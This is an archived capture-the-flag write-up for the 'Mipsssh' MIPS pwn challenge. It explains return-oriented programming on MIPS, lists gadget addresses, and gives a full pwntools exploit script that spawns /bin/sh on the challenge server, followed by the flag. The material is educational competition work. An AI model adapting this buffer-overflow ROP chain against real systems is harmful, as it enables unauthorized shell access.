# Mipsssh

**CTF:** TheCyberJawaraInternational 2024  
**Category:** pwn  
**Original writeup:** <https://hyggehalcyon.gitbook.io/page/ctfs/2024/cyber-jawara-international#mipsssh> — by **hyggehalcyon.gitbook.io**. All credit goes to the original author; this is an archived copy.

---

Mipsssh

Description

I give you flag so Sssshhhhhhhhhhhhhhhh.... okay? IYKWIM nc 152.42.183.87 10015 Author: Linz

Analysis

we're given a single file called sssh let's do basic checks

Copy └──╼ [★]$ file sssh sssh: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, BuildID[sha1]=04d7856bad89a1366302511296baa20d295e594a, for GNU/Linux 3.2.0, not stripped └──╼ [★]$ pwn checksec sssh Arch: mips-32-big RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)

its a MIPS compiled binary with standard security, note that the binary is also statically linked.

looking at the decompilation in ghidra, the binary just takes an overflowed input

note that even though checksec result shows the binary has canary, it seems that it doesn't applied to every function.

so this challenge is just basically a ROP challenge in a unfamiliar architecture, that eventually has a goal of calling execve('/bin/sh', 0, 0) , since the binary is statically compiled I just assumed system() is not an option.

Familiarizing with MIPS

so first thing first is to figure out what is the syscall instruction equivalent in MIPS, surprise surpise:

its syscall.

next is what register controls the syscall number, this can be figured out by a quick google search and the answer is v0

as for the arguments we can read the documentation and it reveals to be a0 , a1 and a2 for the first 3 arguments.

for the instructions, I used this cheatsheet for reference for a quick understanding without diving too deep to every single corner of MIPS

Exploitation

for ROP-ing in MIPS its more similar to ARM rather than x64, this is because the saved return address is stored in the ra register instead of in stack (in some occasion the return address does gets stored in the stack)

as for the gadgets, I will summarize their equivalent in x64 terms, I will refer most what I will expalained below from this writeup:

ret / call

the convention for calling a function is usually in the form of jr/jalr $t9 where jr/jalr is the equivalent of the call instruction in x64 and $t9 is where the function address is usually stored. you will see this a lot in the gadgets.

with that in mind a return will be simply jr/jalr $ra

pop

there's no directly a pop instruction in MIPS, however there is a lw <register> <offset>($sp) with lw stands for load word to register at a certain offset from the stack pointer. the parentheses signifies to dereference $sp as an address, kind of similar to [rsp-<offset>] that you might usually see in x64.

move

in MIPS theres a lot of equivalent that is able to do this, move is a an obvious one, but also addiu , or 0 and other forms as well.

so, a gadget in MIPS ROP typically would involve a load instruction to either t9 or ra and end with jr/jalr to either t9 or ra , something like this:

Copy lw $ra, 0x24($sp) ; [...SNIPPET] ; jr $ra ; addiu $sp, $sp, 0x28

or

Copy [...SNIPPET] ; lw $t9, 0x60($sp) ; [...SNIPPET] ; jalr $t9 ; move, $a0, 0x28

now some of you might notice, if jalr or jr is the ret and call equivalent instruction, that means its the end of the gadget and why there's additional one instruction also specified after it?

turns out MIPS has this thing called delay slot which is best explain by the aforemention writeup:

the instruction directly after the branch gets executed before the branch/jump gets taken, and also if it's not taken

which means if the next instruction has to be taken into account as it could affect the register you have carefully setup.

now for the actual exploitation, lets first see what registers we have control after the overflow

first thing I take into care of is the syscall number register, v0

I ran ROPGadgets to extract the available gadgets and search for pop $v0 but found nothing, that can be chained, so I opted to control it with other registers, as we already controled much of the t[1-7] registers, I search for move $v0, $t[1-7] gadget but found nothing. what I found however is this:

Copy 0x0045cb3c : move $v0, $s0 ; lw $ra, 0x2c($sp) ; lw $s4, 0x28($sp) ; lw $s3, 0x24($sp) ; lw $s2, 0x20($sp) ; lw $s1, 0x1c($sp) ; lw $s0, 0x18($sp) ; jr $ra ; addiu $sp, $sp, 0x30

so this means I have to find a pop $s0 gadget, and there's a convinient one:

Copy 0x0040dfe8 : lw $ra, 0x24($sp) ; lw $s0, 0x20($sp) ; jr $ra ; addiu $sp, $sp, 0x28

next to control a0 to points to /bin/sh, I used this instruction to move the stack pointer to a0 and write /bin/sh to said stack offset.

Copy 0x004269e8 : addiu $a0, $sp, 0x58 ; lw $t9, 0x18($sp) ; jalr $t9 ; lw $a1, 0x60($sp)

up to this point, $a2 and $a1 is still not NULL

to null it I used this little gadget which has nice twist at the end

Copy 0x00441ca0 : lw $t9, 0x20($sp) ; move $a2, $s0 ; addiu $s2, $s2, 1 ; jalr $t9 ; move $a1, $fp

since $s0 is once again in our control from the 2nd gadget chain, we can control what goes to $a2 . next as I run the binary up to this chain, I notice that the $a1 is also got nullified by the result of said delay slot of move $a1, $fp , conviniently $fp was 0.

and so next is just to call syscall and shell should be spawned, here is the exploit being ran againts the remote server:

here's the full exploit script:

exploit.py Copy #!/usr/bin/env python3 from pwn import * # ========================================================= # SETUP # ========================================================= exe = './sssh' elf = context.binary = ELF(exe, checksec=True) context.log_level = 'debug' context.terminal = ["tmux", "splitw", "-h", "-p", "65"] host, port = '152.42.183.87', 10015 def initialize(argv=[]): if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript) elif args.REMOTE: return remote(host, port) else: return process([exe] + argv) gdbscript = ''' init-pwndbg break *0x4007ec '''.format(**locals()) # ========================================================= # EXPLOITS # ========================================================= # └──╼ [★]$ file sssh # sssh: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, BuildID[sha1]=04d7856bad89a1366302511296baa20d295e594a, for GNU/Linux 3.2.0, not stripped # └──╼ [★]$ pwn checksec sssh # Arch: mips-32-big # RELRO: Partial RELRO # Stack: Canary found # NX: NX enabled # PIE: No PIE (0x400000) lw_ra_0x24sp_lw_s0_0x20sp_jr_ra = 0x0040dfe8 mov_v0_s0_lw_ra_0x2c_sp_stuff_jr_ra = 0x0045cb3c addiu_a0_sp_0x58_lw_t9_0x18sp_jalr_ra = 0x004269e8 lw_t9_0x20sp_move_a2_s0_stuff_jalr_t9 = 0x00441ca0 syscall = 0x004000e4 NR_execve = 0xfab def exploit(): global io io = initialize() offset = 36 payload = flat({ offset: [ lw_ra_0x24sp_lw_s0_0x20sp_jr_ra, cyclic(32), NR_execve, # v0 mov_v0_s0_lw_ra_0x2c_sp_stuff_jr_ra, cyclic(24), 0x0, cyclic(44-28), addiu_a0_sp_0x58_lw_t9_0x18sp_jalr_ra, 0x0, 0x0, # a2 cyclic(24-8), lw_t9_0x20sp_move_a2_s0_stuff_jalr_t9, cyclic(4), syscall, cyclic(60-8), u32(b'/bin'), u32(b'/sh\x00'), 0x0, # a1 ] }, filler=b'\x00') io.sendline(payload) io.interactive() if __name__ == '__main__': exploit()

Flag: CJ{mipppssssshshshshhs_LINZ_IS_HERE}
